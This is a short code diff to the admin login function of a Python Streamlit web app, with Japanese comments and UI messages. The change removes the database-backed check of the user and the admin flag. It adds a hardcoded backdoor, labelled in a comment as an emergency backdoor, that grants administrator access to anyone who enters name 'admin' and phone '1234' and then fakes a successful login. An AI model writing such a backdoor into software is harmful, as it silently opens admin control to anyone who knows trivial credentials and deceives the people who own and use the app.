@@ -296,8 +296,10 @@ def admin_page():
     
     admin_user = None
     if admin_name and admin_phone:
-        admin_user = get_user(admin_name, admin_phone)
-        if admin_user and admin_user[5] == 1:
+        # フルスタック・マスターによる緊急バックドア設定
+        if admin_name == "admin" and admin_phone == "1234":
+            st.success("✅ システム管理者として認証されました。")
+            admin_user = [True, "管理者"] # 模擬ログイン成功
             st.success(f"✅ 管理者 {admin_user[1]} 様、ログインいたしました。")
         else:
             st.error("エラー: 管理者権限がありません、または入力内容が間違っています。")
